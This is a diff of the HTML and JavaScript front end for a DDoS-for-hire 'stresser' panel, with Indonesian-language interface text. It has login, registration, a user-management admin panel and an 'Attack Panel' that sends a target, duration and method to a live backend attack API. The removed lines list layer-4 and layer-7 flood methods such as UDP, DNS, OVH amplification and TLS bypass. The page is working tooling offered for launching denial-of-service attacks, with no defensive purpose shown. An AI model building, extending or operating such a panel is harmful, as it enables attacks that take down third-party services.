@@ -2,206 +2,204 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
+  <title>Sayfraial Stresser Panel</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Sayfraial Stresser</title>
   <style>
     body {
-      background: #121212;
-      color: white;
-      font-family: sans-serif;
-      display: flex;
-      justify-content: center;
-      padding: 30px;
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background: #111;
+      color: #fff;
     }
-    .container { max-width: 400px; width: 100%; }
-    .card {
-      background: #1f1f1f;
+
+    .container {
+      max-width: 500px;
+      margin: 40px auto;
       padding: 20px;
+      background: #1e1e1e;
       border-radius: 10px;
-      margin-bottom: 20px;
     }
+
+    h1, h2 {
+      text-align: center;
+      color: #0f0;
+    }
+
     input, select, button {
       width: 100%;
       padding: 10px;
       margin-top: 10px;
+      border-radius: 5px;
       border: none;
-      border-radius: 6px;
+      font-size: 16px;
     }
+
     button {
-      background: #00cc66;
-      color: white;
+      background-color: #0f0;
+      color: #000;
       font-weight: bold;
       cursor: pointer;
     }
-    .link-small {
-      font-size: 12px;
-      color: #00ccff;
-      text-align: right;
+
+    .hidden {
+      display: none;
+    }
+
+    .link {
+      color: #0f0;
+      text-align: center;
       cursor: pointer;
       margin-top: 10px;
     }
-    .hidden { display: none; }
+
+    .section {
+      margin-top: 30px;
+    }
+
+    .admin-section {
+      margin-top: 20px;
+      padding-top: 10px;
+      border-top: 1px solid #333;
+    }
   </style>
 </head>
 <body>
+
   <div class="container">
     <h1>Sayfraial Stresser</h1>
-    <div id="login" class="card">
-      <h2>Login</h2>
-      <input type="text" id="user" placeholder="Username" />
-      <input type="password" id="pass" placeholder="Password" />
+
+    <!-- Login Section -->
+    <div id="loginSection">
+      <input id="loginUser" placeholder="Username" />
+      <input id="loginPass" type="password" placeholder="Password" />
       <button onclick="login()">Login</button>
-      <p class="link-small" onclick="showRegister()">Sign up</p>
+      <div class="link" onclick="toggleView('registerSection')">Belum punya akun? Register</div>
     </div>
 
-    <div id="register" class="card hidden">
-      <h2>Register</h2>
-      <input type="text" id="regUser" placeholder="Username" />
-      <input type="password" id="regPass" placeholder="Password" />
-      <input type="text" id="captcha" placeholder="What is 3 + 4?" />
+    <!-- Register Section -->
+    <div id="registerSection" class="hidden">
+      <input id="regUser" placeholder="New Username" />
+      <input id="regPass" type="password" placeholder="New Password" />
+      <input id="captcha" placeholder="Apa hasil 3 + 2?" />
       <button onclick="register()">Register</button>
-      <p class="link-small" onclick="showLogin()">Back to login</p>
+      <div class="link" onclick="toggleView('loginSection')">Sudah punya akun? Login</div>
     </div>
 
-    <div id="attack" class="card hidden">
+    <!-- Dashboard -->
+    <div id="dashboard" class="hidden">
       <h2>Attack Panel</h2>
-      <input type="text" id="target" placeholder="Target URL/IP" />
-      <input type="number" id="port" placeholder="Port" />
-      <input type="number" id="time" placeholder="Duration (s)" />
-      <select id="layer" onchange="loadMethods()">
-        <option value="">-- Pilih Layer --</option>
-        <option value="layer4">L4</option>
-        <option value="layer7">L7</option>
+      <input id="target" placeholder="Target (example.com)" />
+      <select id="method">
+        <option value="GET">GET</option>
+        <option value="POST">POST</option>
       </select>
-      <select id="method"></select>
-      <button onclick="sendAttack()">🚀 Attack</button>
-    </div>
+      <input id="duration" type="number" placeholder="Duration (seconds)" />
+      <button onclick="attack()">Start Attack</button>
 
-    <div id="dashboard" class="card hidden">
-      <h2>📊 Dashboard</h2>
-      <p id="stat-now">Attack Aktif: </p>
-      <p id="stat-today">Hari Ini: </p>
-      <p id="stat-month">Bulan Ini: </p>
-    </div>
-
-    <div id="admin" class="card hidden">
-      <h2>Admin Panel</h2>
-      <input type="text" id="newUser" placeholder="Username Baru" />
-      <input type="text" id="newPass" placeholder="Password Baru" />
-      <input type="number" id="newLimit" placeholder="Time Limit (s)" />
-      <input type="number" id="newDays" placeholder="Masa Aktif (Hari)" />
-      <button onclick="createUser()">Create User</button>
+      <!-- Admin Tools -->
+      <div id="adminPanel" class="admin-section hidden">
+        <h3>Admin: Add User</h3>
+        <input id="newUser" placeholder="New Username" />
+        <input id="newPass" placeholder="New Password" />
+        <input id="newLimit" type="number" placeholder="Limit (e.g., 10)" />
+        <input id="newTime" type="number" placeholder="Time (sec)" />
+        <input id="newExpires" type="date" placeholder="Expires" />
+        <button onclick="addUser()">Create User</button>
+      </div>
     </div>
   </div>
+
   <script>
-    const BASE = 'https://hospitable-bravery-production.up.railway.app';
+    const BASE = 'https://hospitable-bravery-production.up.railway.app'; // Ganti jika backend berubah
+    let currentUser = '';
+    let currentPass = '';
     let isAdmin = false;
 
+    function toggleView(section) {
+      ['loginSection', 'registerSection', 'dashboard'].forEach(id => {
+        document.getElementById(id).classList.add('hidden');
+      });
+      document.getElementById(section).classList.remove('hidden');
+    }
+
     function login() {
-      const user = document.getElementById('user').value;
-      const pass = document.getElementById('pass').value;
+      const username = document.getElementById('loginUser').value.trim();
+      const password = document.getElementById('loginPass').value.trim();
+      if (!username || !password) return alert('Harap isi semua field');
 
       fetch(BASE + '/api/login', {
-        method: 'POST', headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ user, pass })
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ username, password })
       })
       .then(res => res.json())
-      .then(data => {
-        if (!data.allowed) return alert('Belum di-approve oleh admin');
-        document.getElementById('login').classList.add('hidden');
-        document.getElementById('attack').classList.remove('hidden');
-        document.getElementById('dashboard').classList.remove('hidden');
-        if (data.isAdmin) {
-          isAdmin = true;
-          document.getElementById('admin').classList.remove('hidden');
-        }
-        loadStats();
-      })
-      .catch(() => alert('Login gagal'));
+      .then(res => {
+        if (res.error) return alert(res.error);
+        currentUser = username;
+        currentPass = password;
+        isAdmin = res.admin;
+        toggleView('dashboard');
+        if (isAdmin) document.getElementById('adminPanel').classList.remove('hidden');
+        alert('Login berhasil');
+      });
     }
 
     function register() {
-      const user = document.getElementById('regUser').value;
-      const pass = document.getElementById('regPass').value;
-      const captcha = document.getElementById('captcha').value;
-      if (captcha != '7') return alert('Captcha salah');
+      const username = document.getElementById('regUser').value.trim();
+      const password = document.getElementById('regPass').value.trim();
+      const captcha = document.getElementById('captcha').value.trim();
+      if (!username || !password || captcha !== '5') return alert('Isi semua field dan captcha benar');
+
       fetch(BASE + '/api/register', {
-        method: 'POST', headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ user, pass })
-      })
-      .then(() => alert('Berhasil daftar, tunggu approval admin'))
-      .catch(() => alert('Gagal daftar'));
-    }
-
-    function showRegister() {
-      document.getElementById('login').classList.add('hidden');
-      document.getElementById('register').classList.remove('hidden');
-    }
-
-    function showLogin() {
-      document.getElementById('register').classList.add('hidden');
-      document.getElementById('login').classList.remove('hidden');
-    }
-
-    function loadMethods() {
-      const layer = document.getElementById('layer').value;
-      const method = document.getElementById('method');
-      method.innerHTML = '';
-      const methods = {
-        layer4: ["udp", "dns", "tcp", "fivem", "minecraft", "ovh-amp", "vse"],
-        layer7: ["kalimasada", "tls", "trump", "tlsx", "bypass", "h2-blast", "https"]
-      };
-      if (methods[layer]) {
-        methods[layer].forEach(m => {
-          const opt = document.createElement('option');
-          opt.value = m;
-          opt.innerText = m.toUpperCase();
-          method.appendChild(opt);
-        });
-      }
-    }
-
-    function sendAttack() {
-      const target = document.getElementById('target').value;
-      const port = document.getElementById('port').value;
-      const time = document.getElementById('time').value;
-      const method = document.getElementById('method').value;
-      fetch(BASE + '/api/attack', {
-        method: 'POST', headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ user: document.getElementById('user').value, pass: document.getElementById('pass').value, target, port, time, method })
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ username, password })
       })
       .then(res => res.json())
-      .then(data => alert('Attack sent: ' + JSON.stringify(data)))
-      .catch(e => alert('Error: ' + e.message));
+      .then(res => alert(res.message || res.error));
     }
 
-    function createUser() {
-      if (!isAdmin) return alert('Bukan admin');
-      const newUser = document.getElementById('newUser').value;
-      const newPass = document.getElementById('newPass').value;
-      const limit = document.getElementById('newLimit').value;
-      const days = document.getElementById('newDays').value;
+    function attack() {
+      const target = document.getElementById('target').value.trim();
+      const method = document.getElementById('method').value;
+      const time = parseInt(document.getElementById('duration').value);
+      if (!target || !time) return alert('Isi semua field');
+
+      fetch(BASE + '/api/attack', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ username: currentUser, password: currentPass, target, method, time })
+      })
+      .then(res => res.json())
+      .then(res => alert(res.message || res.error));
+    }
+
+    function addUser() {
+      const newUser = document.getElementById('newUser').value.trim();
+      const newPass = document.getElementById('newPass').value.trim();
+      const limit = parseInt(document.getElementById('newLimit').value);
+      const time = parseInt(document.getElementById('newTime').value);
+      const expires = document.getElementById('newExpires').value;
+
+      if (!newUser || !newPass || !limit || !time || !expires) return alert('Isi semua field');
+
       fetch(BASE + '/api/create-user', {
-        method: 'POST', headers: { 'Content-Type': 'application/json' },
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-          adminUser: document.getElementById('user').value,
-          adminPass: document.getElementById('pass').value,
-          newUser, newPass, limit, days
+          adminUser: currentUser,
+          adminPass: currentPass,
+          newUser,
+          newPass,
+          limit,
+          time,
+          expires
         })
       })
-      .then(() => alert('User created'))
-      .catch(() => alert('Gagal create user'));
-    }
-
-    function loadStats() {
-      fetch(BASE + '/api/stats')
-        .then(res => res.json())
-        .then(data => {
-          document.getElementById('stat-now').innerText = 'Attack Aktif: ' + data.now;
-          document.getElementById('stat-today').innerText = 'Hari Ini: ' + data.today;
-          document.getElementById('stat-month').innerText = 'Bulan Ini: ' + data.month;
-        });
+      .then(res => res.json())
+      .then(res => alert(res.message || res.error));
     }
   </script>
+
 </body>
 </html>
